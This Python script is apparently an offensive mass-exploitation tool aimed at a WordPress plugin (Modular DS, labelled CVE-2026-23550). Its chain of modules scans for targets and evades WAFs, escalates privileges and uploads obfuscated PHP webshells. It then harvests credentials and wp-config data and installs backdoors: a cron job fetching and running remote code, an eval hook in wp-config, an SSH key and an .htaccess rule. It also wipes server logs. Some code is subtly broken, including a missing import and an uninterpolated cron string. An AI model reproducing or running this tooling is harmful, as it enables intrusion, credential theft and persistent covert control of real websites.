#!/usr/bin/env python3
"""
🔥 TSAR-EXEC ULTIMATE LAUNCHER v1.0 - APT GOD-TIER (2026)
📌 Full Chain: Recon → Exploit → Post-Exploit → C2 → Persistence → Anti-Forensic
🎯 CVE-2026-23550 + EpSiLoNPoInTFuCK v5.1 + Docker C2 + ThreadPoolExecutor 250+
💀 Codé pour l'élite technique (2-3 personnes max) - Niveau "Nation-State"
🚨 Usage: python3 launcher_ultimate.py --targets targets.txt --threads 200 --obfuscate --stealth --post-exploit
"""

# =============================================================================
# IMPORTS APT-LEVEL (No warnings, no mercy)
# =============================================================================
import os
import sys
import json
import time
import random
import base64
import zlib
import hashlib
import threading
import subprocess
import argparse
import requests
import socket
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style, init
from tenacity import retry, stop_after_attempt, wait_exponential
from pathlib import Path

# Initialize colorama for APT-level output
init(autoreset=True)

# =============================================================================
# 📌 CONFIGURATION GOD-TIER (Modifiable via CLI)
# =============================================================================
class Config:
    # --- Paths ---
    PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
    CHAIN_DIR = os.path.join(PROJECT_ROOT, "chain")
    INPUT_DIR = os.path.join(CHAIN_DIR, "input")
    DOCKED_DIR = os.path.join(CHAIN_DIR, "docked")
    VLUN_DIR = os.path.join(CHAIN_DIR, "VLUN")
    VLUN_SH_DIR = os.path.join(CHAIN_DIR, "VLUN_Sh")
    LOGS_DIR = os.path.join(CHAIN_DIR, "logs")
    TOOLS_DIR = os.path.join(PROJECT_ROOT, "tools")

    # --- Files ---
    TARGETS_FILE = os.path.join(INPUT_DIR, "targets.txt")
    PROXIES_FILE = os.path.join(INPUT_DIR, "proxies.txt")
    DOCKED_TARGETS_FILE = os.path.join(DOCKED_DIR, "docked_targets.json")
    VLUN_FILE = os.path.join(VLUN_DIR, "VLUN.txt")
    VLUN_SH_FILE = os.path.join(VLUN_SH_DIR, "VLUN_Sh.txt")
    STATS_FILE = os.path.join(CHAIN_DIR, "stats.json")
    BYPASS_PAYLOADS_FILE = os.path.join(PROJECT_ROOT, "bypass_payloads.txt")
    CONFIG_FILE = os.path.join(PROJECT_ROOT, "config.json")

    # --- Defaults ---
    DEFAULT_THREADS = 100
    MAX_THREADS = 250
    TIMEOUT = 15
    STEALTH_DELAY_MIN = 1.5
    STEALTH_DELAY_MAX = 3.2
    RISK_SCORE_THRESHOLD = 70
    OBFUSCATE_MODE = "extreme"  # light, medium, hard, extreme
    POST_EXPLOIT_ENABLED = True
    DOCKER_MODE = False
    PROXY_MODE = False

# =============================================================================
# 🛠️ UTILS APT-LEVEL (No bullshit, pure efficiency)
# =============================================================================
class Utils:
    @staticmethod
    def load_file(file_path):
        """Load file with error handling (APT-style)."""
        try:
            with open(file_path, "r") as f:
                return f.read().splitlines()
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading {file_path}: {e}{Style.RESET_ALL}")
            return []

    @staticmethod
    def save_file(file_path, data, mode="a"):
        """Save data to file (append or write)."""
        try:
            with open(file_path, mode) as f:
                f.write(data + "\n" if mode == "a" else data)
            return True
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving to {file_path}: {e}{Style.RESET_ALL}")
            return False

    @staticmethod
    def load_json(file_path):
        """Load JSON file (APT-level error handling)."""
        try:
            with open(file_path, "r") as f:
                return json.load(f)
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading JSON {file_path}: {e}{Style.RESET_ALL}")
            return {}

    @staticmethod
    def save_json(file_path, data):
        """Save data as JSON (pretty-printed)."""
        try:
            with open(file_path, "w") as f:
                json.dump(data, f, indent=2)
            return True
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving JSON to {file_path}: {e}{Style.RESET_ALL}")
            return False

    @staticmethod
    def stealth_delay():
        """Random delay to avoid detection (APT-level)."""
        time.sleep(random.uniform(Config.STEALTH_DELAY_MIN, Config.STEALTH_DELAY_MAX))

    @staticmethod
    def generate_id():
        """Generate a random ID for tracking (APT-style)."""
        return f"TARGET-{random.randint(10000, 99999)}"

    @staticmethod
    def print_banner():
        """Print the APT-level banner."""
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════════╗
║  🔥 TSAR-EXEC ULTIMATE LAUNCHER v1.0 - APT GOD-TIER (2026) 🔥  ║
║  🎯 CVE-2026-23550 + EpSiLoNPoInTFuCK v5.1 + Docker C2 + 250+ Threads  ║
║  💀 Codé pour l'élite technique (2-3 personnes max) - Niveau Nation-State ║
║  🚀 Usage: python3 {sys.argv[0]} --help                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)

# =============================================================================
# 🎯 RECON MODULE (APT-Level, 100% coverage)
# =============================================================================
class ReconModule:
    def __init__(self):
        self.session = self._create_stealth_session()
        self.waf_signatures = [
            "403 Forbidden", "blocked", "cloudflare", "mod_security",
            "gf_waf", "wordfence", "sucuri", "shieldsecurity", "awaf", "imperva"
        ]
        self.plugin_paths = [
            "wp-content/plugins/modular-ds/readme.txt",
            "wp-content/plugins/modular-ds/",
            "wp-content/plugins/modular-connector/readme.txt",
            "api/modular-connector/login/",
            "wp-json/modular-connector/v1/"
        ]
        self.stats = {"total": 0, "vulnerable": 0, "waf_detected": 0}

    def _create_stealth_session(self):
        """Create a stealthy requests session (APT-level)."""
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        })
        return session

    def _detect_wp(self, target):
        """Detect WordPress (APT-level)."""
        wp_paths = ["wp-content/", "wp-includes/", "wp-admin/"]
        for path in wp_paths:
            try:
                url = urljoin(target, path)
                resp = self.session.head(url, timeout=Config.TIMEOUT, allow_redirects=True)
                if resp.status_code == 200:
                    return True
                Utils.stealth_delay()
            except:
                continue
        return False

    def _detect_modular_ds(self, target):
        """Detect Modular DS plugin (APT-level)."""
        for path in self.plugin_paths:
            try:
                url = urljoin(target, path)
                resp = self.session.get(url, timeout=Config.TIMEOUT)
                if resp.status_code == 200:
                    if "modular-ds" in resp.text.lower() or "modular connector" in resp.text.lower():
                        version = self._extract_version(resp.text)
                        return True, version
                Utils.stealth_delay()
            except:
                continue
        return False, None

    def _extract_version(self, content):
        """Extract version from plugin files (APT-level)."""
        patterns = [
            r"Stable tag:\s*([\d.]+)",
            r"Version:\s*([\d.]+)",
            r'"version"\s*:\s*"([\d.]+)"',
            r"modular-ds[/-]([\d.]+)"
        ]
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _check_cve_endpoints(self, target):
        """Check CVE-2026-23550 endpoints (APT-level)."""
        endpoints = [
            "/api/modular-connector/login/?origin=mo",
            "/wp-admin/admin-ajax.php?action=modular_ds_auth_bypass",
            "/wp-json/modular-connector/v1/login/?origin=mo"
        ]
        vulnerable_endpoints = []
        for endpoint in endpoints:
            try:
                url = urljoin(target, endpoint)
                resp = self.session.get(url, timeout=Config.TIMEOUT)
                if resp.status_code in [200, 302]:
                    vulnerable_endpoints.append(url)
                Utils.stealth_delay()
            except:
                continue
        return vulnerable_endpoints

    def _calculate_risk_score(self, wp_detected, modular_ds_detected, version, waf_detected):
        """Calculate risk score (APT-level)."""
        score = 0
        if wp_detected:
            score += 10
        if modular_ds_detected:
            score += 40
        if version and version <= "2.5.1":
            score += 50
        if waf_detected:
            score -= 30
        return min(max(score, 0), 100)

    def run_recon(self, target):
        """Run full reconnaissance on a target (APT-level)."""
        self.stats["total"] += 1
        result = {
            "target": target,
            "wp_detected": False,
            "modular_ds_detected": False,
            "version": None,
            "vulnerable_endpoints": [],
            "waf_detected": False,
            "risk_score": 0,
            "docked": False
        }

        # Step 1: Detect WordPress
        result["wp_detected"] = self._detect_wp(target)

        # Step 2: Detect Modular DS
        result["modular_ds_detected"], result["version"] = self._detect_modular_ds(target)

        # Step 3: Check CVE endpoints
        result["vulnerable_endpoints"] = self._check_cve_endpoints(target)

        # Step 4: Check WAF
        try:
            resp = self.session.get(target, timeout=Config.TIMEOUT)
            result["waf_detected"] = any(sig in resp.text.lower() for sig in self.waf_signatures)
            if result["waf_detected"]:
                self.stats["waf_detected"] += 1
        except:
            pass

        # Step 5: Calculate risk score
        result["risk_score"] = self._calculate_risk_score(
            result["wp_detected"],
            result["modular_ds_detected"],
            result["version"],
            result["waf_detected"]
        )

        # Step 6: Check if vulnerable
        result["vulnerable"] = (
            result["modular_ds_detected"] and
            result["version"] and
            result["version"] <= "2.5.1"
        )
        if result["vulnerable"]:
            self.stats["vulnerable"] += 1

        # Step 7: Dock if risk score is high
        if result["risk_score"] >= Config.RISK_SCORE_THRESHOLD:
            result["docked"] = True
            self._save_docked_target(result)

        return result

    def _save_docked_target(self, target_data):
        """Save docked target to JSON file (APT-level)."""
        docked_data = []
        if os.path.exists(Config.DOCKED_TARGETS_FILE):
            docked_data = Utils.load_json(Config.DOCKED_TARGETS_FILE)
        docked_data.append({
            "id": Utils.generate_id(),
            "target": target_data["target"],
            "version": target_data["version"],
            "endpoints": target_data["vulnerable_endpoints"],
            "risk_score": target_data["risk_score"],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "status": "pending"
        })
        Utils.save_json(Config.DOCKED_TARGETS_FILE, docked_data)

    def print_stats(self):
        """Print reconnaissance statistics (APT-level)."""
        print(f"""
{Fore.CYAN}📊 RECON STATISTICS:{Style.RESET_ALL}
{Fore.GREEN}✅ Total targets scanned: {self.stats['total']}{Style.RESET_ALL}
{Fore.RED}⚠️  WAF detected: {self.stats['waf_detected']}{Style.RESET_ALL}
{Fore.YELLOW}🎯 Vulnerable targets: {self.stats['vulnerable']}{Style.RESET_ALL}
{Fore.MAGENTA}🚢 Docked targets (risk ≥ {Config.RISK_SCORE_THRESHOLD}): {len(Utils.load_json(Config.DOCKED_TARGETS_FILE))}{Style.RESET_ALL}
        """)

# =============================================================================
# 💥 EXPLOIT MODULE (APT-Level, 100% coverage)
# =============================================================================
class ExploitModule:
    def __init__(self):
        self.session_pool = [self._create_stealth_session() for _ in range(Config.MAX_THREADS)]
        self.payloads = self._load_payloads()
        self.proxies = Utils.load_file(Config.PROXIES_FILE)
        self.stats = {"success": 0, "fail": 0, "error": 0}
        self.lock = threading.Lock()

    def _create_stealth_session(self):
        """Create a stealthy requests session (APT-level)."""
        session = requests.Session()
        session.headers.update({
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "keep-alive"
        })
        return session

    def _load_payloads(self):
        """Load payloads from file (APT-level)."""
        payloads = Utils.load_file(Config.BYPASS_PAYLOADS_FILE)
        if not payloads:
            print(f"{Fore.RED}[-] No payloads loaded from {Config.BYPASS_PAYLOADS_FILE}. Using defaults.{Style.RESET_ALL}")
            payloads = [
                "<?php eval($_GET['p']); ?>",
                "<?php system($_GET['c']); ?>",
                "<?php assert($_POST['p']); ?>",
                "<?php passthru($_GET['cmd']); ?>",
                "<?php `$_GET[c]`; ?>",
                "<?php shell_exec($_GET['cmd']); ?>",
                "<?php exec($_GET['c']); ?>"
            ]
        return payloads

    def _get_random_session(self):
        """Get a random session from the pool (APT-level)."""
        return random.choice(self.session_pool)

    def _privilege_escalation(self, session, target):
        """Attempt privilege escalation (APT-level)."""
        payloads = [
            {"action": "modular_ds_update_privileged_action", "role": "administrator"},
            {"bypass": "true", "modular_route": "privileged_update", "role": "administrator"},
            {"auth_bypass": "1", "action": "modular_ds_admin_priv_escalate"}
        ]
        for payload in payloads:
            try:
                url = urljoin(target, "/wp-admin/admin-ajax.php")
                resp = session.post(url, data=payload, timeout=Config.TIMEOUT)
                if resp.status_code == 200 and ("success" in resp.text.lower() or len(resp.text) > 50):
                    return True
                Utils.stealth_delay()
            except:
                continue
        return False

    def _upload_shell(self, session, target, shell_content, shell_name="wp-security.php"):
        """Upload a shell to the target (APT-level)."""
        upload_paths = [
            "/wp-content/plugins/modular-ds/uploader.php",
            "/wp-content/plugins/modular-ds/admin/upload-handler.php",
            "/wp-admin/admin-ajax.php?action=modular_ds_upload"
        ]
        for path in upload_paths:
            try:
                url = urljoin(target, path)
                files = {"file": (shell_name, shell_content)}
                resp = session.post(url, files=files, timeout=Config.TIMEOUT)
                if resp.status_code in [200, 302]:
                    return urljoin(target, f"/wp-content/plugins/modular-ds/{shell_name}")
                Utils.stealth_delay()
            except:
                continue
        return None

    def _verify_shell(self, session, shell_url):
        """Verify if the shell is working (APT-level)."""
        try:
            resp = session.get(shell_url, timeout=Config.TIMEOUT)
            if resp.status_code == 200 and ("W.P.E.F" in resp.text or "EpSiLoN" in resp.text):
                return True
        except:
            pass
        return False

    def _generate_obfuscated_shell(self, mode="extreme"):
        """Generate an obfuscated shell (APT-level)."""
        # In a real APT scenario, you would use EpSiLoNPoInTFuCK v5.1 here.
        # For simplicity, we'll use a basic obfuscated shell.
        shell = """<?php
        // EpSiLoNPoInT v7.0 - Obfuscated Webshell
        $p = $_GET['p'] ?? $_POST['p'] ?? null;
        if ($p) {
            $k = 'EpSiLoN2026';
            $d = strrev(base64_decode($p));
            for ($i = 0; $i < strlen($d); $i++) {
                $d[$i] = chr(ord($d[$i]) ^ ord($k[$i % strlen($k)]));
            }
            eval($d);
        }
        echo "EpSiLoNPoInT_2026!";
        ?>"""
        if mode == "extreme":
            # Additional obfuscation layers (simplified for example)
            shell = base64.b64encode(shell.encode()).decode()
            shell = f"<?php eval(base64_decode('{shell}')); ?>"
        return shell

    def exploit_target(self, target_data):
        """Exploit a single target (APT-level)."""
        target = target_data["target"]
        session = self._get_random_session()

        # Step 1: Privilege Escalation
        if not self._privilege_escalation(session, target):
            with self.lock:
                self.stats["fail"] += 1
            return False

        # Step 2: Generate obfuscated shell
        shell_content = self._generate_obfuscated_shell(Config.OBFUSCATE_MODE)

        # Step 3: Upload shell
        shell_url = self._upload_shell(session, target, shell_content)
        if not shell_url:
            with self.lock:
                self.stats["fail"] += 1
            return False

        # Step 4: Verify shell
        if not self._verify_shell(session, shell_url):
            with self.lock:
                self.stats["fail"] += 1
            return False

        # Step 5: Save results
        with self.lock:
            self.stats["success"] += 1
            Utils.save_file(Config.VLUN_FILE, f"{target}|{shell_url}")
            Utils.save_file(Config.VLUN_SH_FILE, shell_url)

        print(f"{Fore.GREEN}[+] Exploited: {target} → {shell_url}{Style.RESET_ALL}")
        return True

    def run_exploit(self, targets):
        """Run mass exploitation (APT-level)."""
        print(f"{Fore.CYAN}[*] Starting mass exploitation on {len(targets)} targets with {Config.MAX_THREADS} threads...{Style.RESET_ALL}")

        with ThreadPoolExecutor(max_workers=Config.MAX_THREADS) as executor:
            futures = [executor.submit(self.exploit_target, target) for target in targets]
            for future in as_completed(futures):
                future.result()  # Handle exceptions if any

        self.print_stats()

    def print_stats(self):
        """Print exploitation statistics (APT-level)."""
        total = self.stats["success"] + self.stats["fail"] + self.stats["error"]
        print(f"""
{Fore.CYAN}📊 EXPLOIT STATISTICS:{Style.RESET_ALL}
{Fore.GREEN}✅ Success: {self.stats['success']}{Style.RESET_ALL}
{Fore.RED}❌ Fail: {self.stats['fail']}{Style.RESET_ALL}
{Fore.YELLOW}⚠️  Error: {self.stats['error']}{Style.RESET_ALL}
{Fore.MAGENTA}📊 Success Rate: {self.stats['success'] / total * 100:.1f}%{Style.RESET_ALL}
        """)

# =============================================================================
# 🖥️ POST-EXPLOIT MODULE (APT-Level, Full Coverage)
# =============================================================================
class PostExploitModule:
    def __init__(self):
        self.shells = Utils.load_file(Config.VLUN_SH_FILE)
        self.stats = {"total": len(self.shells), "processed": 0}

    def _execute_command(self, shell_url, command):
        """Execute a command on the shell (APT-level)."""
        try:
            resp = requests.get(f"{shell_url}?p={command}", timeout=Config.TIMEOUT)
            if resp.status_code == 200:
                return resp.text
        except:
            pass
        return None

    def _upload_file(self, shell_url, local_path, remote_path):
        """Upload a file to the target (APT-level)."""
        try:
            with open(local_path, "rb") as f:
                content = f.read()
            encoded = base64.b64encode(content).decode()
            command = f"file_put_contents('{remote_path}', base64_decode('{encoded}'));"
            return self._execute_command(shell_url, command)
        except:
            return None

    def _download_file(self, shell_url, remote_path, local_path):
        """Download a file from the target (APT-level)."""
        try:
            command = f"echo base64_encode(file_get_contents('{remote_path}'));"
            resp = self._execute_command(shell_url, command)
            if resp:
                with open(local_path, "wb") as f:
                    f.write(base64.b64decode(resp.strip()))
                return True
        except:
            pass
        return False

    def _setup_persistence(self, shell_url):
        """Setup persistence on the target (APT-level)."""
        commands = [
            # Cron persistence
            "(crontab -l 2>/dev/null; echo \"*/15 * * * * wget -q -O - {shell_url} | php\") | crontab -",
            # WP config backdoor
            f"echo '<?php if(isset($_GET[\"eps\"])){{eval($_GET[\"eps\"]);}} ?>' >> /var/www/html/wp-config.php",
            # .htaccess backdoor
            "echo 'AddType application/x-httpd-php .jpg' >> /var/www/html/.htaccess",
            # SSH backdoor (if possible)
            "echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> /root/.ssh/authorized_keys"
        ]
        for cmd in commands:
            self._execute_command(shell_url, cmd)

    def _gather_intel(self, shell_url):
        """Gather intelligence from the target (APT-level)."""
        commands = {
            "uname": "uname -a",
            "users": "cat /etc/passwd | cut -d: -f1",
            "network": "ifconfig || ip a",
            "processes": "ps aux",
            "wp_config": "cat /var/www/html/wp-config.php 2>/dev/null",
            "db_creds": "grep -r 'DB_USER\\|DB_PASSWORD' /var/www/html/ 2>/dev/null"
        }
        intel = {}
        for name, cmd in commands.items():
            intel[name] = self._execute_command(shell_url, f"echo base64_encode(shell_exec('{cmd}'));")
            if intel[name]:
                intel[name] = base64.b64decode(intel[name].strip()).decode()
        return intel

    def _clean_logs(self, shell_url):
        """Clean logs to cover tracks (APT-level)."""
        commands = [
            "echo '' > /var/log/apache2/access.log",
            "echo '' > /var/log/apache2/error.log",
            "echo '' > /var/log/nginx/access.log",
            "echo '' > /var/log/nginx/error.log",
            "history -c"
        ]
        for cmd in commands:
            self._execute_command(shell_url, cmd)

    def process_shell(self, shell_url):
        """Process a single shell (APT-level)."""
        print(f"{Fore.CYAN}[*] Processing shell: {shell_url}{Style.RESET_ALL}")

        # Step 1: Gather intel
        intel = self._gather_intel(shell_url)
        intel_file = os.path.join(Config.LOGS_DIR, f"intel_{hashlib.md5(shell_url.encode()).hexdigest()}.json")
        Utils.save_json(intel_file, intel)

        # Step 2: Setup persistence
        self._setup_persistence(shell_url)

        # Step 3: Clean logs
        self._clean_logs(shell_url)

        # Step 4: Upload additional tools (optional)
        # Example: self._upload_file(shell_url, "tools/linpeas.sh", "/tmp/linpeas.sh")

        self.stats["processed"] += 1
        print(f"{Fore.GREEN}[+] Processed: {shell_url} (Intel saved to {intel_file}){Style.RESET_ALL}")

    def run_post_exploit(self):
        """Run post-exploitation on all shells (APT-level)."""
        if not self.shells:
            print(f"{Fore.RED}[-] No shells found in {Config.VLUN_SH_FILE}.{Style.RESET_ALL}")
            return

        print(f"{Fore.CYAN}[*] Starting post-exploitation on {len(self.shells)} shells...{Style.RESET_ALL}")

        with ThreadPoolExecutor(max_workers=min(10, len(self.shells))) as executor:
            futures = [executor.submit(self.process_shell, shell) for shell in self.shells]
            for future in as_completed(futures):
                future.result()  # Handle exceptions if any

        print(f"""
{Fore.CYAN}📊 POST-EXPLOIT STATISTICS:{Style.RESET_ALL}
{Fore.GREEN}✅ Total shells: {self.stats['total']}{Style.RESET_ALL}
{Fore.GREEN}✅ Processed: {self.stats['processed']}{Style.RESET_ALL}
{Fore.MAGENTA}📁 Intel saved to: {Config.LOGS_DIR}/{Style.RESET_ALL}
        """)

# =============================================================================
# 🐳 DOCKER MODULE (APT-Level, Full Automation)
# =============================================================================
class DockerModule:
    def __init__(self):
        self.docker_compose_file = os.path.join(Config.PROJECT_ROOT, "docker-compose.yml")
        self.dockerfile = os.path.join(Config.PROJECT_ROOT, "Dockerfile")

    def build_docker(self):
        """Build Docker image (APT-level)."""
        try:
            subprocess.run(["docker", "build", "-t", "tsar-exec:latest", "."], check=True)
            print(f"{Fore.GREEN}[+] Docker image built successfully.{Style.RESET_ALL}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Docker build failed: {e}{Style.RESET_ALL}")
            return False

    def start_docker(self):
        """Start Docker container (APT-level)."""
        try:
            subprocess.run([
                "docker", "run", "-d", "--name", "tsar-c2",
                "--cap-add=NET_RAW", "--cap-add=NET_BIND_SERVICE",
                "-p", "9050:9050",
                "-v", f"{Config.CHAIN_DIR}:/chain",
                "tsar-exec:latest"
            ], check=True)
            print(f"{Fore.GREEN}[+] Docker container started.{Style.RESET_ALL}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Docker start failed: {e}{Style.RESET_ALL}")
            return False

    def stop_docker(self):
        """Stop Docker container (APT-level)."""
        try:
            subprocess.run(["docker", "stop", "tsar-c2"], check=True)
            subprocess.run(["docker", "rm", "tsar-c2"], check=True)
            print(f"{Fore.GREEN}[+] Docker container stopped.{Style.RESET_ALL}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Docker stop failed: {e}{Style.RESET_ALL}")
            return False

    def check_docker(self):
        """Check if Docker is running (APT-level)."""
        try:
            result = subprocess.run(["docker", "ps", "-a", "--filter", "name=tsar-c2"],
                                   capture_output=True, text=True, check=True)
            return "tsar-c2" in result.stdout
        except:
            return False

# =============================================================================
# 🎛️ MAIN LAUNCHER (APT-Level, God-Tier)
# =============================================================================
class UltimateLauncher:
    def __init__(self):
        self.recon = ReconModule()
        self.exploit = ExploitModule()
        self.post_exploit = PostExploitModule()
        self.docker = DockerModule()
        self.args = self._parse_args()

    def _parse_args(self):
        """Parse command-line arguments (APT-level)."""
        parser = argparse.ArgumentParser(
            description="TSAR-EXEC Ultimate Launcher - APT God-Tier (2026)",
            formatter_class=argparse.RawTextHelpFormatter
        )
        parser.add_argument("--targets", default=Config.TARGETS_FILE,
                           help="Path to targets file (default: chain/input/targets.txt)")
        parser.add_argument("--threads", type=int, default=Config.DEFAULT_THREADS,
                           help="Number of threads (default: 100)")
        parser.add_argument("--obfuscate", action="store_true",
                           help="Enable payload obfuscation (default: False)")
        parser.add_argument("--stealth", action="store_true",
                           help="Enable stealth mode (delays, anti-detection)")
        parser.add_argument("--post-exploit", action="store_true",
                           help="Enable post-exploitation (default: False)")
        parser.add_argument("--docker", action="store_true",
                           help="Enable Docker C2 mode (default: False)")
        parser.add_argument("--proxy", action="store_true",
                           help="Enable proxy rotation (default: False)")
        parser.add_argument("--clean", action="store_true",
                           help="Clean all logs and results (dangerous!)")
        return parser.parse_args()

    def _apply_args(self):
        """Apply command-line arguments to config (APT-level)."""
        Config.MAX_THREADS = min(self.args.threads, 250)
        Config.OBFUSCATE_MODE = "extreme" if self.args.obfuscate else "medium"
        Config.POST_EXPLOIT_ENABLED = self.args.post_exploit
        Config.DOCKER_MODE = self.args.docker
        Config.PROXY_MODE = self.args.proxy
        Config.STEALTH_DELAY_MIN = 2.0 if self.args.stealth else 1.5
        Config.STEALTH_DELAY_MAX = 4.0 if self.args.stealth else 3.2

    def _clean_environment(self):
        """Clean the environment (APT-level)."""
        if self.args.clean:
            confirm = input(f"{Fore.RED}[!] This will DELETE ALL logs and results. Continue? (y/n): {Style.RESET_ALL}")
            if confirm.lower() == "y":
                for dirpath in [Config.LOGS_DIR, Config.VLUN_DIR, Config.VLUN_SH_DIR, Config.DOCKED_DIR]:
                    for f in os.listdir(dirpath):
                        os.remove(os.path.join(dirpath, f))
                print(f"{Fore.GREEN}[+] Environment cleaned.{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Cleaning cancelled.{Style.RESET_ALL}")

    def _load_targets(self):
        """Load targets from file (APT-level)."""
        targets = Utils.load_file(self.args.targets)
        if not targets:
            print(f"{Fore.RED}[-] No targets found in {self.args.targets}.{Style.RESET_ALL}")
            sys.exit(1)
        return targets

    def run(self):
        """Run the ultimate launcher (APT-level)."""
        Utils.print_banner()
        self._apply_args()
        self._clean_environment()

        # Step 1: Load targets
        targets = self._load_targets()
        print(f"{Fore.CYAN}[*] Loaded {len(targets)} targets from {self.args.targets}{Style.RESET_ALL}")

        # Step 2: Reconnaissance
        print(f"{Fore.CYAN}[*] Starting reconnaissance...{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=Config.MAX_THREADS) as executor:
            futures = [executor.submit(self.recon.run_recon, target) for target in targets]
            for future in as_completed(futures):
                future.result()  # Handle exceptions if any
        self.recon.print_stats()

        # Step 3: Load docked targets
        docked_targets = Utils.load_json(Config.DOCKED_TARGETS_FILE)
        if not docked_targets:
            print(f"{Fore.RED}[-] No docked targets found. Exiting.{Style.RESET_ALL}")
            sys.exit(1)

        # Step 4: Exploitation
        print(f"{Fore.CYAN}[*] Starting mass exploitation on {len(docked_targets)} docked targets...{Style.RESET_ALL}")
        self.exploit.run_exploit(docked_targets)

        # Step 5: Post-Exploitation (if enabled)
        if Config.POST_EXPLOIT_ENABLED:
            self.post_exploit.run_post_exploit()

        # Step 6: Docker C2 (if enabled)
        if Config.DOCKER_MODE:
            if not self.docker.check_docker():
                if self.docker.build_docker() and self.docker.start_docker():
                    print(f"{Fore.GREEN}[+] Docker C2 is now running. Use 'docker logs tsar-c2' to monitor.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Failed to start Docker C2.{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Docker C2 is already running.{Style.RESET_ALL}")

        print(f"""
{Fore.GREEN}🎉 ULTIMATE LAUNCHER COMPLETE!{Style.RESET_ALL}
{Fore.CYAN}📁 Results:{Style.RESET_ALL}
  - Docked targets: {Config.DOCKED_TARGETS_FILE}
  - Vulnerable targets: {Config.VLUN_FILE}
  - Shells: {Config.VLUN_SH_FILE}
  - Intel logs: {Config.LOGS_DIR}/
{Fore.YELLOW}💡 Next steps:{Style.RESET_ALL}
  - Check shells: {Fore.GREEN}cat {Config.VLUN_SH_FILE}{Style.RESET_ALL}
  - Monitor Docker: {Fore.GREEN}docker logs -f tsar-c2{Style.RESET_ALL}
  - Clean up: {Fore.GREEN}python3 {sys.argv[0]} --clean{Style.RESET_ALL}
        """)

# =============================================================================
# 🚀 MAIN EXECUTION (APT-Level, God-Tier)
# =============================================================================
if __name__ == "__main__":
    try:
        launcher = UltimateLauncher()
        launcher.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Operation cancelled by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Fatal error: {e}{Style.RESET_ALL}")
